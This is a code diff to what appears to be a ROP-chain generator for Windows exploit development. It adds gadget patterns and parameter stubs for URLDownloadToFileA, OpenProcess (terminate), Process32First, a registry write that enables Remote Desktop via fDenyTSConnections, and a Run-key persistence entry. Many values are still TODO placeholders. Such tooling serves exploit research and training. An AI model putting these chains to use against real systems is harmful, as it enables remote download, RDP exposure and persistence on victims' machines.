@@ -11496,15 +11496,9 @@ class getParamVals:
 		return False,0,"VirtualProtect Ptr not Found"
 
 	def get_dfPTR(self,name,excludeRegs,r,r2,bad,pk):
-		dp("get DeleteFileA_PTR")
-		l=0x30702 # Placeholder address
-		comment=""
-		try:
-			l = dllDict["kernel32.dll"]["DeleteFileA"]
-		except:
-			dp("Ptr to DeleteFileA not found.")
-			comment = "Ptr to DeleteFileA not found. 0x30702 used as placeholder."
-			return True, l, comment
+		# TODO: make 0x30702 will be a pointer to DeleteFileA
+		comment = ""
+		return True, 0x90909090, comment
 
 	def get_dfPTR_RT(self,name,excludeRegs,r,r2,bad,pk):		
 		wE=0x77662244
@@ -11529,15 +11523,9 @@ class getParamVals:
 		return False,wE,"DeleteFileA not Found"	
 
 	def get_winPTR(self,name,excludeRegs,r,r2,bad,pk):
-		dp("get WinExecPTR")
-		wEPtr=0x30902 # Placeholder address
+		# TODO: make 0x30902 which will be a pointer to WinExecStub
 		comment=""
-		try:
-			wEPtr = dllDict["kernel32.dll"]["WinExec"]
-		except:
-			dp("Ptr to WinExec not found.")
-			comment = "Ptr to WinExec not found. 0x30902 used as placeholder."
-			return True, wEPtr, comment
+		return True, 0x90909090, comment
 
 	def get_winPTR_RT(self,name,excludeRegs,r,r2,bad,pk):		
 		wE=0x77443322
@@ -11635,6 +11623,12 @@ class getParamVals:
 		return False,0,"ReturnAddress not found"
 	def get_ret_c2(self,name,excludeRegs,r,r2,bad,pk):
 		# dp ("get_ret_c2", r, r2)
+		if type(r2)==str:
+			try:
+				r2=int(r2)
+			except:
+				r2=int(r2,16)
+
 		val=r2
 		foundRC2, rC2p,cRc2=findRetC2(bad,val)
 		comment=""
@@ -11669,15 +11663,31 @@ class getParamVals:
 		return False,0,""
 
 	def get_CTh32SPtr(self, name, excludeRegs, r, r2, bad, pk):
-	    dp("get CreateToolhelp32SnapshotPtr")
-	    l = 0x30802  # Placeholder address
-	    comment = ""
-	    try:
-	        l = dllDict["kernel32.dll"]["CreateToolhelp32Snapshot"]
-	    except:
-	        dp("Ptr to CreateToolhelp32Snapshot not found.")
-	        comment = "Ptr to CreateToolhelp32Snapshot not found. 0x30802 used as placeholder."
-	    return True, l, comment
+		# TODO: make 0x30802 which will be a pointer to CreateToolhelp32SnapshotStub
+		comment = ""
+		return True, 0x90909090, comment
+
+	def get_CTh32SPtr_RT(self, name, excludeRegs, r, r2, bad, pk):
+		Cth32_RT=0x75bb4120
+		comment=""
+		foundLL=False
+		try:
+			Cth32_RT=dllDict["kernel32.dll"]["CreateToolhelp32Snapshot"]
+			foundLL=True
+		except:
+			try:
+				Cth32_RT=dllDict["kernelbase.dll"]["CreateToolhelp32Snapshot"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment="Ptr to CreateToolhelp32Snapshot not found. 0x75bb4120 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to CreateToolhelp32Snapshot")	
+			comment="Ptr to CreateToolhelp32Snapshot"
+			return True, Cth32_RT,comment
+		else:
+			return True,Cth32_RT,"Simulated value-CreateToolhelp32Snapshot ptr not found!"
+		return False,Cth32_RT,"CreateToolhelp32Snapshot not Found"
 
 	def get_dwFlags(self, name, excludeRegs, r, r2, bad, pk):
 	    flags_value = 0x2
@@ -11688,6 +11698,247 @@ class getParamVals:
 	    process_id_value = 0x0
 	    comment = "current process"
 	    return True, process_id_value, comment
+
+	def get_UDtFA_RT(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement the runtime address of URLDownloadToFileA
+		UDtFA_RT=0x0af0bd08
+		comment=""
+		foundLL=False
+		try:
+			UDtFA_RT=dllDict["Urlmon.dll"]["URLDownloadToFile"]
+			foundLL=True
+		except:
+			try:
+				UDtFA_RT=dllDict["Urlmon.dll"]["URLDownloadToFile"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment="Ptr to URLDownloadToFile not found. 0x90909090 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to URLDownloadToFile")	
+			comment="Ptr to URLDownloadToFile"
+			return True, UDtFA_RT,comment
+		else:
+			return True,UDtFA_RT,"Simulated value-URLDownloadToFile ptr not found!"
+		return False, UDtFA_RT, "URLDownloadToFile not Found"
+
+	def get_pCaller(self, name, excludeRegs, r, r2, bad, pk):
+		comment = ""
+		value = 0x0
+		return True, value, comment
+
+	def get_szURL(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: use ESP to load a string like "http://httpbin.org/image/jpeg"
+		# varStr = "http://httpbin.org/image/jpeg"
+		value=0x90909090
+		comment=''
+		return True, value, comment
+
+	def szFileName(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: load a string like "download-file1.jpeg"
+		# varStr = "download-file1.jpeg"
+		value=0x90909090
+		comment=''
+		return True, value, comment
+
+	def get_dwReserved(self, name, excludeRegs, r, r2, bad, pk):
+		value = 0x0
+		comment=''
+		return True, value, comment
+
+	def get_lpfnCB(self, name, excludeRegs, r, r2, bad, pk):
+		value = 0x0
+		comment=''
+		return True, value, comment
+
+	def get_OP_RT(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement the runtime address of OpenProcess
+		OP_RT=0x0af0bd06
+		comment=""
+		foundLL=False
+		try:
+			OP_RT=dllDict["kernel32.dll"]["OpenProcess"]
+			foundLL=True
+		except:
+			try:
+				OP_RT=dllDict["kernelbase.dll"]["OpenProcess"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment="Ptr to OpenProcess not found. 0x90909090 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to OpenProcess")	
+			comment="Ptr to OpenProcess"
+			return True, OP_RT,comment
+		else:
+			return True,OP_RT,"Simulated value-OpenProcess ptr not found!"
+		return False, OP_RT, "OpenProcess not Found"
+
+	def get_dwDesiredAccess(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x1
+		comment='PROCESS_TERMINATE'
+		return True, value, comment
+
+	def get_bInheritHandle(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x0
+		comment='FALSE'
+		return True, value, comment
+
+	def get_OP_PTR(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement pointer to OpenProcess
+		OP_PTR=0x0af0bd04
+		comment=""
+		foundLL=False
+		try:
+			OP_PTR=dllDict["kernel32.dll"]["OpenProcess"]
+			foundLL=True
+		except:
+			try:
+				OP_PTR=dllDict["kernelbase.dll"]["OpenProcess"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment="Ptr to OpenProcess not found. 0x90909090 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to OpenProcess")	
+			comment="Ptr to OpenProcess"
+			return True, OP_PTR,comment
+		else:
+			return True,OP_PTR,"Simulated value-OpenProcess ptr not found!"
+		return False, OP_PTR, "OpenProcess not Found"
+
+	def get_dwProcessId():
+	# TODO: implement dwProcessId parameter with "MOV DEREFERENCE" which comes after the pushad and is the last parameter.
+	# dwProcessID points to the PID
+		comment=''
+		return True, 0x0, comment
+
+	def get_P32F_RT(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement runtime address of Process32First
+		P32F_RT=0x0af0bd02
+		comment=""
+		foundLL=False
+		try:
+			P32F_RT=dllDict["kernel32.dll"]["Process32First"]
+			foundLL=True
+		except:
+			try:
+				P32F_RT=dllDict["kernelbase.dll"]["Process32First"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment="Ptr to Process32First not found. 0x90909090 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to Process32First")	
+			comment="Ptr to Process32First"
+			return True, P32F_RT,comment
+		else:
+			return True,P32F_RT,"Simulated value-Process32First ptr not found!"
+		return False, P32F_RT, "Process32First not Found"
+
+	def get_hSnapshot(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: point to the handle from CreateToolhelp32Snapshot
+	# CreateToolhelp32Snapshot puts in EAX
+		value=0x90909090
+		comment='handle from CreateToolhelp32Snapshot'
+		return True, value, comment
+
+	def get_lppe(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: point to the PROCESSENTRY32 struct
+		value=0x90909090
+		comment='PROCESSENTRY32 struct'
+		return True, value, comment
+
+	def get_RSKV_RT(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement runtime address of RegSetKeyValueA
+		RSKV_RT=0x0af0bd03
+		comment=""
+		foundLL=False
+		try:
+			RSKV_RT=dllDict["Advapi32.dll"]["RegSetKeyValueA"]
+			foundLL=True
+		except:
+			try:
+				RSKV_RT=dllDict["Advapi32.dll"]["RegSetKeyValueA"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment="Ptr to RegSetKeyValueA not found. 0x90909090 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to RegSetKeyValueA")	
+			comment="Ptr to RegSetKeyValueA"
+			return True, RSKV_RT,comment
+		else:
+			return True,RSKV_RT,"Simulated value-RegSetKeyValueA ptr not found!"
+		return False, RSKV_RT, "RegSetKeyValueA not Found"
+
+	def get_lpData(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement a pointer to 0x1
+		comment=''
+		return True, 0x0, comment
+
+	def get_cbData(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x4
+		comment=''
+		return True, value, comment
+
+	def get_dwType(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x4
+		comment='REG_DWORD'
+		return True, value, comment
+
+	def get_hKey_RSKV(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x80000002
+		comment='HKEY_LOCAL_MACHINE'
+		return True, value, comment
+
+	def get_lpValueName(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement varStr = 'fDenyTSConnections'
+		comment=''
+		return True, 0x0, comment
+
+	def get_lpSubKey_RSKV(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement varStr = 'SYSTEM\CurrentControlSet\Control\Terminal Server'
+		comment=''
+		return True, 0x0, comment
+
+	def get_RCKV_RT(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement runtime address of RegCreateKeyA
+		RCKV_RT=0x0af0bd05
+		comment=""
+		foundLL=False
+		try:
+			RCKV_RT=dllDict["Advapi32.dll"]["RegCreateKeyA"]
+			foundLL=True
+		except:
+			try:
+				RCKV_RT=dllDict["Advapi32.dll"]["RegCreateKeyA"]
+				foundLL=True
+			except:
+				foundLL=False
+				comment="Ptr to RegCreateKeyA not found. 0x90909090 used as placeholder."
+		if foundLL:
+			dp ("returning ptr to RegCreateKeyA")	
+			comment="Ptr to RegCreateKeyA"
+			return True, RCKV_RT,comment
+		else:
+			return True,RCKV_RT,"Simulated value-RegCreateKeyA ptr not found!"
+		return False, RCKV_RT, "RegCreateKeyA not Found"
+
+	def get_hKey_RCKV(self, name, excludeRegs, r, r2, bad, pk):
+		value=0x80000001
+		comment='HKEY_CURRENT_USER'
+		return True, value, comment
+
+	def get_lpSubKey_RCKV(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement varStr = 'SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
+		comment=''
+		return True, 0x0, comment
+
+	def get_phkResult(self, name, excludeRegs, r, r2, bad, pk):
+	# TODO: implement a pointer which holds the output [OUT]
+		comment=''
+		return True, 0x0, comment
 
 pv=getParamVals()
 
@@ -12456,7 +12707,7 @@ pat = {  'LoLi1':{
 		'8': {'r': 'ecx', 'val': 'dwFlags', 'excluded':[], "r2":"",'com':'dwFlags'}
         },
        	'CTh32S2':{
-		'1': {'r': 'edi', 'val': 'pop', 'excluded':["esi"], "r2":"",'com':''},
+		'1': {'r': 'edi', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
 		'2': {'r': 'ecx', 'val': 'dwFlags', 'excluded':[], "r2":"",'com':'dwFlags'},
 		'3': {'r': 'esi', 'val': 'CTh32SPtr', 'excluded':[], "r2":"",'com':'Ptr to CreateToolhelp32Snapshot'},
 		'4': {'r': 'ebp', 'val': 'pop', 'excluded':["esi"], "r2":"",'com':''},
@@ -12554,8 +12805,216 @@ pat = {  'LoLi1':{
 		'6': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], 'r2':'','com':'Return address'},
 		'7': {'r': 'ecx', 'val': 'dwFlags', 'excluded':[], 'r2':'','com':'dwFlags'},
 		'8': {'r': 'edi', 'val': 'addESP', 'excluded':[], 'r2':'4','com':''}
-        }
+        },
 
+        'UDtFA1':{
+		'1': {'r': 'edi', 'val': 'UDtFA_RT', 'excluded':[], "r2":'','com':''},
+		'2': {'r': 'eax', 'val': 'pop', 'excluded':["ebx","ecx","edx", "esi","edi","ebp"],"r2":"",'com':'pop eax'},
+		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'4': {'r': 'ebp', 'val': 'pCaller', 'excluded':[], "r2":"",'com':'pCaller'},
+		'5': {'r': 'esp', 'val': 'szURL', 'excluded':[], "r2":"",'com':'szURL'},
+		'6': {'r': 'ebx', 'val': 'szFileName', 'excluded':[], "r2":"",'com':'szFileName'},
+		'7': {'r': 'edx', 'val': 'dwReserved', 'excluded':[], "r2":"",'com':'dwReserved'},
+		'8': {'r': 'ecx', 'val': 'lpfnCB', 'excluded':[], "r2":"",'com':'lpfnCB'}
+        },
+
+        'UDtFA2':{
+		'1': {'r': 'edi', 'val': 'UDtFA_RT', 'excluded':[], "r2":'','com':''},
+		'2': {'r': 'eax', 'val': 'addESP', 'excluded':[],"r2":"0xc",'com':''},
+		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'4': {'r': 'ebp', 'val': 'pCaller', 'excluded':[], "r2":"",'com':'pCaller'},
+		'5': {'r': 'esp', 'val': 'szURL', 'excluded':[], "r2":"",'com':'szURL'},
+		'6': {'r': 'ebx', 'val': 'szFileName', 'excluded':[], "r2":"",'com':'szFileName'},
+		'7': {'r': 'edx', 'val': 'dwReserved', 'excluded':[], "r2":"",'com':'dwReserved'},
+		'8': {'r': 'ecx', 'val': 'lpfnCB', 'excluded':[], "r2":"",'com':'lpfnCB'}
+        },
+
+        'OP1':{
+        '1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":'8','com':''},
+		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'OP_RT', 'excluded':[], "r2":"",'com':'OpenProcessStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'ecx', 'val': 'dwDesiredAccess', 'excluded':[], "r2":"",'com':'dwDesiredAccess'}
+        },
+
+        'OP2':{
+        '1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":'8','com':''},
+		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'OP_RT', 'excluded':[], "r2":"",'com':'OpenProcessStub'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'jmp', 'excluded':[], "r2":"ebp",'com':''},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'ecx', 'val': 'dwDesiredAccess', 'excluded':[], "r2":"",'com':'dwDesiredAccess'}
+        },
+
+        'OP3':{
+        '1': {'r': 'edi', 'val': 'pop', 'excluded':[], "r2":'','com':''},
+		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
+		'3': {'r': 'esi', 'val': 'OP_RT', 'excluded':[], "r2":"",'com':'OpenProcessStub'},
+		'4': {'r': 'ebp', 'val': 'pop', 'excluded':["edi", "esi"], "r2":"",'com':''},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'jmp', 'excluded':[], "r2":"esi",'com':''},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'ecx', 'val': 'dwDesiredAccess', 'excluded':[], "r2":"",'com':'dwDesiredAccess'}
+        },
+
+        'OP4':{
+        '1': {'r': 'edi', 'val': 'pop', 'excluded':[], "r2":'','com':''},
+		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
+		'3': {'r': 'esi', 'val': 'OP_PTR', 'excluded':[], "r2":"",'com':'Ptr to OpenProcess'},
+		'4': {'r': 'ebp', 'val': 'pop', 'excluded':["edi", "esi"], "r2":"",'com':''},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'ecx', 'val': 'dwDesiredAccess', 'excluded':[], "r2":"",'com':'dwDesiredAccess'}
+        },
+
+        'OP5':{
+        '1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":'8','com':''},
+		'2': {'r': 'eax', 'val': 'bInheritHandle', 'excluded':[],"r2":"",'com':'bInheritHandle'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'OP_PTR', 'excluded':[], "r2":"",'com':'Ptr to OpenProcess'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'ecx', 'val': 'dwDesiredAccess', 'excluded':[], "r2":"",'com':'dwDesiredAccess'}
+        },
+
+        'P32F1':{
+        '1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":'8','com':''},
+		'2': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'}
+        },
+
+     	'P32F2':{
+      	'1': {'r': 'edi', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'pop', 'excluded':["edi", "esi"], "r2":"",'com':''},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'} 
+        },
+
+        'P32F3':{
+      	'1': {'r': 'edi', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'addESP', 'excluded':["edi", "esi"], "r2":"4",'com':''},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'} 
+        },
+
+        'P32F4':{
+      	'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":"0xc",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'} 
+        },
+
+        'P32F5':{
+      	'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":"4",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'addESP', 'excluded':[], "r2":"4",'com':''},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'} 
+        },
+
+		'P32F6':{
+      	'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":"0xc",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'addESP', 'excluded':[], "r2":"4",'com':''},
+		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'} 
+        },
+
+		'P32F7':{
+      	'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":"0xc",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'ret_c2', 'excluded':[], "r2":"4",'com':''},
+		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'} 
+        },
+
+        'P32F8':{
+      	'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":"4",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'addESP', 'excluded':[], "r2":"4",'com':''},
+		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'} 
+        },
+		
+		'P32F9':{
+      	'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":"0xc",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'pop', 'excluded':["edi"], "r2":"",'com':''},
+		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'} 
+        },
+
+        'P32F10':{
+      	'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":"4",'com':''},
+		'2': {'r': 'ecx', 'val': 'hSnapshot', 'excluded':[], "r2":"",'com':'hSnapshot'},
+		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'4': {'r': 'ebp', 'val': 'pop', 'excluded':["edi", "esi"], "r2":"",'com':''},
+		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
+		'6': {'r': 'ebx', 'val': 'P32F_RT', 'excluded':[], "r2":"",'com':'Process32FirstStub'},
+		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'8': {'r': 'eax', 'val': 'lppe', 'excluded':[],"r2":"",'com':'lppe'}
+        },
+
+        "RSKV1":{
+        '1': {'r': 'edi', 'val': 'RSKV_RT', 'excluded':[], "r2":"",'com':'RegSetKeyValueAStub'},
+		'2': {'r': 'ecx', 'val': 'lpData', 'excluded':[], "r2":"",'com':'lpData'},
+		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'4': {'r': 'ebp', 'val': 'hKey_RSKV', 'excluded':[], "r2":"",'com':'hKey_RSKV'},
+		'5': {'r': 'esp', 'val': 'lpSubKey_RSKV', 'excluded':[], "r2":"",'com':'lpSubKey_RSKV'},
+		'6': {'r': 'ebx', 'val': 'lpValueName', 'excluded':[], "r2":"",'com':'lpValueName'},
+		'7': {'r': 'edx', 'val': 'dwType', 'excluded':[], "r2":"",'com':'dwType'},
+		'8': {'r': 'eax', 'val': 'cbData', 'excluded':[],"r2":"",'com':'cbData'}
+        },
+
+        "RCKV1":{
+        '1': {'r': 'edi', 'val': 'RCKV_RT', 'excluded':[], "r2":"",'com':'RegCreateKeyAStub'},
+		'2': {'r': 'ecx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'3': {'r': 'esi', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
+		'4': {'r': 'ebp', 'val': 'hKey_RCKV', 'excluded':[], "r2":"",'com':'hKey_RCKV'},
+		'5': {'r': 'esp', 'val': 'lpSubKey_RCKV', 'excluded':[], "r2":"",'com':'lpSubKey_RCKV'},
+		'6': {'r': 'ebx', 'val': 'phkResult', 'excluded':[], "r2":"",'com':'phkResult'},
+		'7': {'r': 'edx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
+		'8': {'r': 'eax', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'}
+        }
         }
 
 def giveRegValsFromDict(dict,t,i):
@@ -12595,7 +13054,7 @@ def buildPushadInner(bad,excludeRegs,winApi,apiNum,apiCode,pk1, completePKs,stop
 		length1=True
 		pk=[]
 
-		tellWhy=False
+		tellWhy=True
 		foundL1, pl1, lr1,r1 = loadRegP(1,i, bad,True,excludeRegs2,pk)
 		if foundL1:
 			excludeRegs2=addExRegs(excludeRegs2, r1)
@@ -12777,7 +13236,23 @@ def giveApiNum(winApi,j):
 		apiCode="DF"
 	elif winApi == "CTh32S":
 		apiNum=11
-		apiCode="CTh32S"					
+		apiCode="CTh32S"
+	elif winApi == "UDtFA":
+		apiNum=2
+		apiCode="UDtFA"
+	elif winApi == "OP":
+		apiNum=5
+		apiCode="OP"
+	elif winApi == "P32F":
+		apiNum=10
+		apiCode="P32F"
+	elif winApi == "RSKV":
+		apiNum=1
+		apiCode="RSKV"
+	elif winApi == "RCKV":
+		apiNum=1
+		apiCode="RCKV"
+
 	i=apiCode+str(j)
 	curPat=i
 	return i,j, apiCode, apiNum
@@ -12864,6 +13339,36 @@ def buildPushad(bad, patType):
 		foundInnerCT,outputsTxtCT, outputsTxtCCT,outputsPkCT=buildPushadInner(bad,excludeRegs2,"CTh32S",11,"apiCode",pk,pk,stopCode)
 		if foundInnerCT:
 			printGadgetChain(outputsTxtCT, "CreateToolhelp32Snapshot")
+
+	elif patType == "UDtFA":
+		stopCode="UDtFA"
